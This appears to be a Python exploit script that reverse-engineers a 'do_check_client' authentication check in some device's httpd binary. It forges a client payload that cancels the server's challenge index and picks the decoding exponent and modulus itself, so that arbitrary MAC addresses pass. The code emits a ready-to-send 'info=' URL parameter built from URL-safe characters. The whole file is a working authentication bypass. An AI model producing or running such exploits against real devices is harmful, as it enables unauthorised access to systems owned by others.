#!/usr/bin/env python3
import itertools


# should be a faithful implementation of what is implemented in the vm bytecode for
# do_check_client in the httpd binary.
def verify_do_check_client(
    client_data: list[int],
    remote_mac_address: bytes,
    calculated_idx: int,
    local_mac_address: bytes,
) -> int:
    """some description"""
    processed_word0 = pow(client_data[0], 0x1687, 0x7561)
    processed_word1 = pow(client_data[1], 0x1687, 0x7561)
    processed_word2 = pow(client_data[2], 0x1687, 0x7561)
    processed_word3 = pow(client_data[3], 0x1687, 0x7561)

    derived_exponent = (processed_word0 * calculated_idx) + processed_word1
    derived_modulus = (processed_word2 * calculated_idx) + processed_word3

    # print(f"Derived exponent: {derived_exponent}, derived modulus: {derived_modulus}")

    client_data = client_data[4:]
    remaining_word_len = len(client_data)
    work_buffer = [0] * len(client_data)

    if remaining_word_len < 6:
        print(f"Warning: Remaining client_data words are less than 6")
        return 0

    for i in range(6):
        work_buffer[i] = pow(client_data[i], derived_exponent, derived_modulus) & 0xFF

    calculated_local_mac = bytes(work_buffer[:6])
    if calculated_local_mac != local_mac_address:
        print(f"local mismatch {calculated_local_mac} != {local_mac_address}")
        return 0

    for i in range(6, remaining_word_len):
        work_buffer[i] = pow(client_data[i], derived_exponent, derived_modulus) & 0xFF

        if i >= 6 and (i + 1) % 6 == 0:
            calculated_remote_mac = bytes(work_buffer[i - 5 : i + 1])
            if calculated_remote_mac != remote_mac_address:
                print(f"local mismatch {calculated_remote_mac} != {remote_mac_address}")
                continue
            return 1

    return 0


def int_alphabet_generator(alphabet: str, integer_length: int):
    alphabet_bytes = alphabet.encode("utf-8")
    for combination in itertools.product(alphabet_bytes, repeat=integer_length):
        yield int.from_bytes(bytes(combination), byteorder="little")


def evaluate_alphabet(
    alphabet: str, exponent: int, modulus: int, value_map=lambda x: x
):
    """
    Determine if a proposed alphabet of payload bytes is still able to encode all values that
    a payload with no restrictions could represent.

    value_map can be used to to make the search faster by limiting the search space.

    Returns a mapping of desired inputs and the inputs that produce them (we're just
    going to brute force this because of the alphabet constraints)
    """

    # we don't care about it being _actually_ complete, we just want it to not
    # be worse than an unrestricted alphabet
    unrestricted_possible_values = set()
    for i in range(modulus):
        unrestricted_possible_values.add(value_map(pow(i, exponent, modulus)))

    possible_values = dict()
    for num in int_alphabet_generator(alphabet, 4):
        result = value_map(pow(num, exponent, modulus))
        if result not in possible_values:
            possible_values[result] = num
            if len(possible_values) == len(unrestricted_possible_values):
                # no point continuing, all possible values now represented
                return possible_values

    assert (
        False
    ), f"Not all possible values found within modulus {len(possible_values)} / {len(unrestricted_possible_values)}"


# some subset of chars it should be safe to use in the urlparam
alphabet = "lmaoztebcdfghijknpqrsuvwxy"

# used for the first 4 entries in client_data, before a new exponent and
# modulus are derived. figure out all representable values so we can use
# this when we craft the first 4 integers of payload which let us control
# the derived values used for the rest of the decoding
header_encoding_map = evaluate_alphabet(alphabet, 0x1687, 0x7561)

# since it turns out we have absolute control over the exponent and modulus,
# can just precalculate. we also only care about the lower byte of the encoded
# values, as do_check_client truncates the modular exponentation result when
# calculating mac address bytes. so once we have all possible lower bytes, we're
# done.
mac_encoding_map = evaluate_alphabet(alphabet, 0x1, 0x1687, lambda x: x & 0xFF)


def create_payload_array(local_mac, remote_mac, _calculated_idx: int):
    payload = []

    # new exponent/modulus will be derived based on our input and this
    # index which is selected randomly and given to us. we have to work
    # with a exponent of the form:
    #
    # new_exponent = (pow(input1, 0x1687, 0x7561) * calculated_idx) + pow(input2, 0x1687, 0x7561)
    # new_modulus = (pow(input3, 0x1687, 0x7561) * calculated_idx) + pow(input4, 0x1687, 0x7561)
    #
    # we're going to take advantage of the multiply, and pick input1 and input3 such that
    # calculated_idx is multiplied by 0, making it irrelevant to payload generation. in other
    # words, regardless of challenge value we're going to be able to encode mac addresses
    # using an exponent of 1 and a modulus of 0x1687.

    # exponent
    payload.append(header_encoding_map[0])  # input1; cancels out calculated_idx
    payload.append(header_encoding_map[1])  # input2; selected exponent

    # modulus
    payload.append(header_encoding_map[0])  # input3; cancels out calculated_idx
    payload.append(header_encoding_map[0x1687])  # input4; selected modulus

    # since we've now gotten control of the exponent and modulus, we just staple the
    # local and remote mac addresses to the payload. the second copy of the remote mac
    # is probably unnecessary, but it also shouldn't hurt and reduces risk of me not
    # being able to test on a device myself.
    payload.extend(
        map(mac_encoding_map.__getitem__, local_mac + remote_mac + remote_mac)
    )

    return payload


# ensure resiliency over possible values, ostensibly we should have to
# derive what calculated_idx (iRsaIndex in the binary) from some info they
# back to us earlier in the handshake process.
#
# edit: lol nevermind, they'll multiply the challenge by a value we control
# and can make 0 so uh, off to irrelevancy this bit goes.
# for calculated_idx in range(1, 0x2000):


def parse_mac(input_str: str) -> bytes:
    raw_bytes = bytes.fromhex(input_str.replace(":", ""))
    assert len(raw_bytes) == 6, f"invalid mac: {input_str}"
    return raw_bytes


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("--calculated_idx", type=int, default=1234)
    parser.add_argument("local_mac", type=parse_mac)
    parser.add_argument("remote_mac", type=parse_mac)

    a = parser.parse_args()

    payload = create_payload_array(a.local_mac, a.remote_mac, a.calculated_idx)
    if not verify_do_check_client(payload, a.remote_mac, 1234, a.local_mac):
        print("we are sad :(")

    print(
        f"calculated payload for local mac {a.local_mac.hex(':')} and remote mac {a.remote_mac.hex(':')}"
    )
    print(
        f"info={len(payload)}|{b''.join(map(lambda x: x.to_bytes(4, 'little'), payload)).decode('utf-8')}"
    )
